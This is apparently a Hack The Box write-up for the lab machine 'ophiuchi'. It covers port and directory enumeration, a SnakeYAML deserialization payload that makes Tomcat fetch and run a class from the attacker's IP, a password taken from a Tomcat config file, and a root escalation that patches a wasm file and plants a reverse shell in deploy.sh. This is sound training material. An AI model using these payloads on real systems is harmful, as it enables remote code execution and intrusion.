# ophiuchi

## Nmap scan

[Scan results][1]

From the nmap scan results only a tomcat server on port 8080 and an ssh server.

Going on the home page of the Tomcat server there is a "Yaml parser" but whatever the input it says `Due to security reason this feature has been temporarily on hold. We will soon fix the issue!`

Putting a `'` we can cause an exception on the server

```raw
org.yaml.snakeyaml.scanner.ScannerImpl.scanFlowScalarSpaces(ScannerImpl.java:1916)
 org.yaml.snakeyaml.scanner.ScannerImpl.scanFlowScalar(ScannerImpl.java:1831)
 org.yaml.snakeyaml.scanner.ScannerImpl.fetchFlowScalar(ScannerImpl.java:1027)
 org.yaml.snakeyaml.scanner.ScannerImpl.fetchSingle(ScannerImpl.java:1002)
 org.yaml.snakeyaml.scanner.ScannerImpl.fetchMoreTokens(ScannerImpl.java:390)
 org.yaml.snakeyaml.scanner.ScannerImpl.checkToken(ScannerImpl.java:227)
 org.yaml.snakeyaml.parser.ParserImpl$ParseImplicitDocumentStart.produce(ParserImpl.java:195)
 org.yaml.snakeyaml.parser.ParserImpl.peekEvent(ParserImpl.java:158)
 org.yaml.snakeyaml.parser.ParserImpl.checkEvent(ParserImpl.java:148)
 org.yaml.snakeyaml.composer.Composer.getSingleNode(Composer.java:118)
 org.yaml.snakeyaml.constructor.BaseConstructor.getSingleData(BaseConstructor.java:150)
 org.yaml.snakeyaml.Yaml.loadFromReader(Yaml.java:490)
 org.yaml.snakeyaml.Yaml.load(Yaml.java:416)
 Servlet.doPost(Servlet.java:15)
 javax.servlet.http.HttpServlet.service(HttpServlet.java:652)
 javax.servlet.http.HttpServlet.service(HttpServlet.java:733)
 org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)
```

## gobuster dir -u "http://ophiuchi.htb:8080" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o ophiuchi-dir.txt

[Scan results][2]

`gobuster` found 3 directory

- `test`
- `yaml` that seems the homepage 
- `manager` that require authentication

## Yaml page

The yaml page use the `snakeyaml` for tomcat wich is vulnerable to this [exploit][3]

So putting into the page field 

```raw
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.14.217/"]
  ]]
]
```

 The tomcat container will request to our machine a payload to load.

Let's write the java class the will load an RCE module inside the tomcat container.

[Java Exploit source][4]

## Tomcat

Now we have a reverse shell with user `tomcat`.

[Linpeas Results][5] didnt show nothing usefull.

Looking into the configuration files of tomcat we find the password for `admin` for the manger page:
***admin:whythereisalimit*** that can be used to login via `su`

## from Admin to Root

`sudo -l` says that admin can run without password `/usr/bin/go run /opt/wasm-functions/index.go`

```go
package main

import (
	"fmt"
	wasm "github.com/wasmerio/wasmer-go/wasmer"
	"os/exec"
	"log"
)


func main() {
	bytes, _ := wasm.ReadBytes("main.wasm")

	instance, _ := wasm.NewInstance(bytes)
	defer instance.Close()
	init := instance.Exports["info"]
	result,_ := init()
	f := result.String()
	if (f != "1") {
		fmt.Println("Not ready to deploy")
	} else {
		fmt.Println("Ready to deploy")
		out, err := exec.Command("/bin/sh", "deploy.sh").Output()
		if err != nil {
			log.Fatal(err)
		}
		fmt.Println(string(out))
	}
}
```

Application seems to load `main.wasm` and if `main.wasm` returns 1 then exec a script called `deploy.sh` both `main.wasm` and `deploy.sh` are called by relative path so we can use another directory using this two files to create our way to root.

First of all we need to decompile `main.wasm` to understand how it works.

We can convert the `main.wasm` to a text readable file using `wasm2wat` from the [WABT Suite][6]

The text converted `main.wasm` is:

```raw
(module
  (type (;0;) (func (result i32)))
  (func $info (type 0) (result i32)
    i32.const 0)
  (table (;0;) 1 1 funcref)
  (memory (;0;) 16)
  (global (;0;) (mut i32) (i32.const 1048576))
  (global (;1;) i32 (i32.const 1048576))
  (global (;2;) i32 (i32.const 1048576))
  (export "memory" (memory 0))
  (export "info" (func $info))
  (export "__data_end" (global 1))
  (export "__heap_base" (global 2)))
```

Looking at index.go we recognize the `info` function so we can try to modify it's return value from 0 to 1 and recompile it using `wat2wasm`. Then upload again to the box with a modified version of `deploy.sh` with a reverse shell and see if we get root.

And it works!


![htbbadge](https://www.hackthebox.eu/badge/image/272787)
![achievement](https://www.hackthebox.eu/storage/achievements/14395d98b55bc4a9c89fb53243c9e13c.png)

[//]: #links
[1]: nmap/ophiuchi.nmap
[2]: ophiuchi-dir.txt
[3]: https://medium.com/@swapneildash/snakeyaml-deserilization-exploited-b4a2c5ac0858
[4]: Exploit
[5]: linpeas.txt
[6]: https://github.com/WebAssembly/wabt
